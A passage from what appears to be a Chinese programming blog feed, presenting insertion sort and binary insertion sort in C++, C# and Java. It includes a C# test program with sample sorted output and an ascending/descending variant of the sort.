</span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>,temp;    </span><br><span class="line">    <span class="keyword">int</span> count = array.Length;    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; count; i++)    </span><br><span class="line">    &#123;    </span><br><span class="line">        temp = array[i];    </span><br><span class="line">        j = i;    </span><br><span class="line">        <span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; array[j - <span class="number">1</span>] &gt;= temp)    </span><br><span class="line">        &#123;    </span><br><span class="line">            array[j] = array[j - <span class="number">1</span>];    </span><br><span class="line">            j -= <span class="number">1</span>;    </span><br><span class="line">        &#125;    </span><br><span class="line">        array[j] = temp;    </span><br><span class="line">        PrintArray(array);    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Java-Code-1"><a href="#Java-Code-1" class="headerlink" title="Java Code"></a>Java Code</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">InsertSort</span><span class="params">(<span class="keyword">int</span>[] array)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>,temp;    </span><br><span class="line">    <span class="keyword">int</span> count = array.length;    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; count; i++)    </span><br><span class="line">    &#123;    </span><br><span class="line">        temp = array[i];    </span><br><span class="line">        j = i;    </span><br><span class="line">        <span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; array[j - <span class="number">1</span>] &gt;= temp)    </span><br><span class="line">        &#123;    </span><br><span class="line">            array[j] = array[j - <span class="number">1</span>];    </span><br><span class="line">            j -= <span class="number">1</span>;    </span><br><span class="line">        &#125;    </span><br><span class="line">        array[j] = temp;   </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">InsertSort</span><span class="params">(List&lt;Integer&gt; array)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>,temp;    </span><br><span class="line">    <span class="keyword">int</span> count = array.size();    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; count; i++)    </span><br><span class="line">    &#123;    </span><br><span class="line">        temp = array.get(i);    </span><br><span class="line">        j = i;    </span><br><span class="line">        <span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; array.get(j - <span class="number">1</span>) &gt;= temp)    </span><br><span class="line">        &#123;    </span><br><span class="line">        array.set(j, array.get(j-<span class="number">1</span>));    </span><br><span class="line">            j -= <span class="number">1</span>;    </span><br><span class="line">        &#125;    </span><br><span class="line">        array.set(j, temp);   </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="对半插入排序算法"><a href="#对半插入排序算法" class="headerlink" title="对半插入排序算法"></a>对半插入排序算法</h1><h2 id="C-Code-4"><a href="#C-Code-4" class="headerlink" title="C++ Code"></a>C++ Code</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">HalfInsertSort</span><span class="params">(<span class="keyword">int</span>* a,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>, temp, low, high, mid;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line">temp = a[i];</span><br><span class="line">low = <span class="number">0</span>;</span><br><span class="line">high = i - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (low &lt;= high)</span><br><span class="line">&#123;</span><br><span class="line">mid = (low + high) / <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (temp &lt; a[mid]) high = mid - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> low = mid + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (j = i - <span class="number">1</span>; j &gt;= low; j--) a[j + <span class="number">1</span>] = a[j];</span><br><span class="line">a[low] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Code-5"><a href="#C-Code-5" class="headerlink" title="C# Code"></a>C# Code</h2><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">HalfInsertSort</span>(<span class="params"><span class="keyword">int</span>[] array</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>, temp, low, high, mid;</span><br><span class="line">    <span class="keyword">int</span> count = array.Length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; count; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = array[i];</span><br><span class="line">        low = <span class="number">0</span>;</span><br><span class="line">        high = i - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (low &lt;= high)</span><br><span class="line">        &#123;</span><br><span class="line">            mid = (low + high) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (temp &lt; array[mid]) high = mid - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> low = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (j = i - <span class="number">1</span>; j &gt;= low; j--) array[j + <span class="number">1</span>] = array[j];</span><br><span class="line">        array[low] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Java-Code-2"><a href="#Java-Code-2" class="headerlink" title="Java Code"></a>Java Code</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">HalfInsertSort</span><span class="params">(<span class="keyword">int</span>[] array)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>, temp, low, high, mid;</span><br><span class="line">    <span class="keyword">int</span> count = array.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; count; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = array[i];</span><br><span class="line">        low = <span class="number">0</span>;</span><br><span class="line">        high = i - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (low &lt;= high)</span><br><span class="line">        &#123;</span><br><span class="line">            mid = (low + high) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (temp &lt; array[mid]) high = mid - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> low = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (j = i - <span class="number">1</span>; j &gt;= low; j--) array[j + <span class="number">1</span>] = array[j];</span><br><span class="line">        array[low] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">HalfInsertSort</span><span class="params">(List&lt;Integer&gt; array)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>, temp, low, high, mid;</span><br><span class="line">    <span class="keyword">int</span> count = array.size();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; count; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = array.get(i);</span><br><span class="line">        low = <span class="number">0</span>;</span><br><span class="line">        high = i - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (low &lt;= high)</span><br><span class="line">        &#123;</span><br><span class="line">            mid = (low + high) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (temp &lt; array.get(mid)) high = mid - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> low = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (j = i - <span class="number">1</span>; j &gt;= low; j--) array.set(j+<span class="number">1</span>,array.get(j));</span><br><span class="line">        array.set(low, temp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><span><a>反馈请点击:</a><a target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=lKWmp62soKykoqLU5eW69-v5" style="text-decoration:none"><img src="http://rescdn.qqmail.com/zh_CN/htmledition/images/function/qm_open/ico_mailme_11.png" alt></a></span></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;ensp; &amp;ensp; &amp;ensp; 本文集中汇总&lt;code&gt;冒泡排序&lt;/code&gt;、&lt;code&gt;插入排序&lt;/code&gt;、&lt;code&gt;对半插入排序&lt;/code&gt;三种算法，并分别用&lt;code&gt;C++&lt;/code&gt;、&lt;code&gt;C#&lt;/code&gt;、&lt;code&gt;Java&lt;/code&gt;三种语言实现。&lt;/p&gt;
    
    </summary>
    
    
      <category term="data structure" scheme="http://blog.lxzh.app/tags/data-structure/"/>
    
  </entry>
  
  <entry>
    <title>基础排序算法(三)——对半插入排序</title>
    <link href="http://blog.lxzh.app/2014/04/19/Basic-Sort-Algorithm-BinaryInsertSort/"/>
    <id>http://blog.lxzh.app/2014/04/19/Basic-Sort-Algorithm-BinaryInsertSort/</id>
    <published>2014-04-19T04:20:52.000Z</published>
    <updated>2020-12-25T15:50:58.420Z</updated>
    
    <content type="html"><![CDATA[<p>&ensp; &ensp; &ensp; 之前的文章介绍了<a href="http://blog.lxzh.app/2013/09/25/Basic-Sort-Algorithm-BubbleSort/"><font color="blue">冒泡排序</font></a>和<a href="http://blog.lxzh.app/2013/09/30/Basic-Sort-Algorithm-InsertionSort/"><font color="blue">插入排序</font></a>，这里再补充一个<code>对半插入排序</code>算法，它与<code>对半查找算法</code>（<code>二分查找算法</code>）有点相似之处。</p><p>&ensp; &ensp; &ensp; 还是先上代码：</p><a id="more"></a><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">HalfInsertSort</span>(<span class="params"><span class="keyword">int</span>[] array</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>, temp, low, high, mid;</span><br><span class="line">    <span class="keyword">int</span> count = array.Length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; count; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = array[i];</span><br><span class="line">        low = <span class="number">0</span>;</span><br><span class="line">        high = i - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (low &lt;= high)</span><br><span class="line">        &#123;</span><br><span class="line">            mid = (low + high) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (temp &lt; array[mid]) high = mid - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> low = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (j = i - <span class="number">1</span>; j &gt;= low; j--) array[j + <span class="number">1</span>] = array[j];</span><br><span class="line">        array[low] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&ensp; &ensp; &ensp; 在<code>Program</code>的<code>Main</code>函数里New一个<a href="http://blog.lxzh.app/2013/09/25/Basic-Sort-Algorithm-BubbleSort/"><font color="blue">（一）</font></a>中写的那个<code>CSharpArray</code>类，调用其中的方法测试：</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">BasicStructure</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            CSharpArray csharArray = <span class="keyword">new</span> CSharpArray(<span class="number">8</span>);</span><br><span class="line">            <span class="keyword">int</span>[] array = csharArray.getArray();</span><br><span class="line">            Console.WriteLine(<span class="string">"排序前:"</span>);</span><br><span class="line">            Console.WriteLine();</span><br><span class="line">            csharArray.PrintArray(array);</span><br><span class="line">            Console.WriteLine();</span><br><span class="line">            Console.WriteLine(<span class="string">"排序后:"</span>);</span><br><span class="line">            csharArray.HalfInsertSort(array);</span><br><span class="line">            csharArray.PrintArray(array);</span><br><span class="line"></span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&ensp; &ensp; &ensp; 输出结果：<br>&ensp; &ensp; &ensp; 排序前:</p><pre><code>1       0       2       5       4       1       3       4</code></pre><p>&ensp; &ensp; &ensp; 排序后:</p><pre><code>0       1       1       2       3       4       4       5</code></pre><p>&ensp; &ensp; &ensp; 为了显示<code>for</code>循环中的每次执行结果，在<code>HalfInsertSort</code>方法里加一句输出：</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">HalfInsertSort</span>(<span class="params"><span class="keyword">int</span>[] array</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>, temp, low, high, mid;</span><br><span class="line">    <span class="keyword">int</span> count = array.Length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; count; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = array[i];</span><br><span class="line">        low = <span class="number">0</span>;</span><br><span class="line">        high = i - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (low &lt;= high)</span><br><span class="line">        &#123;</span><br><span class="line">            mid = (low + high) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (temp &lt; array[mid]) high = mid - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> low = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (j = i - <span class="number">1</span>; j &gt;= low; j--) array[j + <span class="number">1</span>] = array[j];</span><br><span class="line">        array[low] = temp;</span><br><span class="line">        PrintArray(array);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&ensp; &ensp; &ensp; 再次编译运行即得以下结果：<br>&ensp; &ensp; &ensp; 排序前:</p><pre><code>1       0       2       5       4       1       3       4</code></pre><p>&ensp; &ensp; &ensp; 排序后:</p><pre><code>0       1       2       5       4       1       3       40       1       2       5       4       1       3       40       1       2       5       4       1       3       40       1       2       4       5       1       3       40       1       1       2       4       5       3       40       1       1       2       3       4       5       40       1       1       2       3       4       4       50       1       1       2       3       4       4       5</code></pre><p>&ensp; &ensp; &ensp; 从输出结果可以看出，遍历数组元素，利用对半查找原理找到其位置，插入，将受影响的元素一次前移。</p><p>&ensp; &ensp; &ensp; 同样，为了将以上的升序排序算法改为降序，也只需将<code>while</code>括号里的大于号改为小于号即可。</p><p>&ensp; &ensp; &ensp; 这里，既然将其封装在一个类里，自然要提高其通用性，因此，我可以再给改排序算法添加一个参数，用来标记是升序排序还是降序排序。如：用<strong>“0”</strong>表示<strong>升序</strong>，用<strong>“1”</strong>表示<strong>降序</strong>，在不降低代码运行效率时以牺牲代码简洁性来修改一下代码：</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">HalfInsertSort</span>(<span class="params"><span class="keyword">int</span>[] array, <span class="keyword">int</span> orderType</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> j = <span class="number">0</span>, temp,low,high,mid;</span><br><span class="line">   <span class="keyword">int</span> count = array.Length;</span><br><span class="line">   <span class="keyword">if</span> (orderType == <span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; count; i++)</span><br><span class="line">      &#123;</span><br><span class="line">          temp = array[i];</span><br><span class="line">          low = <span class="number">0</span>;</span><br><span class="line">          high = i - <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">while</span> (low &lt;= high)</span><br><span class="line">          &#123;</span><br><span class="line">              mid = (low + high) / <span class="number">2</span>;</span><br><span class="line">              <span class="keyword">if</span> (temp &lt; array[mid]) high = mid - <span class="number">1</span>;</span><br><span class="line">              <span class="keyword">else</span> low = mid + <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">for</span> (j = i - <span class="number">1</span>; j &gt;= low; j--) array[j + <span class="number">1</span>] = array[j];</span><br><span class="line">          array[low] = temp;</span><br><span class="line">          PrintArray(array);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span> (orderType == <span class="number">1</span>)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; count; i++)</span><br><span class="line">      &#123;</span><br><span class="line">          temp = array[i];</span><br><span class="line">          low = <span class="number">0</span>;</span><br><span class="line">          high = i - <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">while</span> (low &lt; high)</span><br><span class="line">          &#123;</span><br><span class="line">              mid = (low + high) / <span class="number">2</span>;</span><br><span class="line">              <span class="keyword">if</span> (temp &gt; array[mid]) high = mid - <span class="number">1</span>;</span><br><span class="line">              <span class="keyword">else</span> low = mid + <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">for</span> (j = i - <span class="number">1</span>; j &gt;= low; j--) array[j + <span class="number">1</span>] = array[j];</span><br><span class="line">          array[low] = temp;</span><br><span class="line">          PrintArray(array);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&ensp; &ensp; &ensp; 再修改<code>Main</code>函数里代码：</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">BasicStructure</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            CSharpArray csharArray = <span class="keyword">new</span> CSharpArray(<span class="number">8</span>);</span><br><span class="line">            <span class="keyword">int</span>[] array = csharArray.getArray();</span><br><span class="line">            Console.WriteLine(<span class="string">"排序前:"</span>);</span><br><span class="line">            Console.WriteLine();</span><br><span class="line">            csharArray.PrintArray(array);</span><br><span class="line">            Console.WriteLine();</span><br><span class="line">            Console.WriteLine(<span class="string">"升序排序后:"</span>);</span><br><span class="line">            csharArray.HalfInsertSort(array, <span class="number">0</span>);</span><br><span class="line">            csharArray.PrintArray(array);</span><br><span class="line">            Console.WriteLine(<span class="string">"降序排序后:"</span>);</span><br><span class="line">            csharArray.HalfInsertSort(array, <span class="number">1</span>);</span><br><span class="line">            csharArray.PrintArray(array);</span><br><span class="line"></span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&ensp; &ensp; &ensp; 编译运行结果如下所示：<br>&ensp; &ensp; &ensp; 排序前:</p><pre><code>2       4       0       3       5       6       1       1</code></pre><p>&ensp; &ensp; &ensp; 升序排序后:</p><pre><code>2       4       0       3       5       6       1       10       2       4       3       5       6       1       10       2       3       4       5       6       1       10       2       3       4       5       6       1       10       2       3       4       5       6       1       10       1       2       3       4       5       6       10       1       1       2       3       4       5       60       1       1       2       3       4       5       6</code></pre><p>&ensp; &ensp; &ensp; 降序排序后:</p><pre><code>1       0       1       2       3       4       5       61       1       0       2       3       4       5       62       1       1       0       3       4       5       63       2       1       1       0       4       5       64       3       2       1       1       0       5       65       4       3       2       1       1       0       66       5       4       3       2       1       1       06       5       4       3       2       1       1       0</code></pre><p>&ensp; &ensp; &ensp; 最后，再次贴一下<code>CSharpArray</code>类的代码：</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span 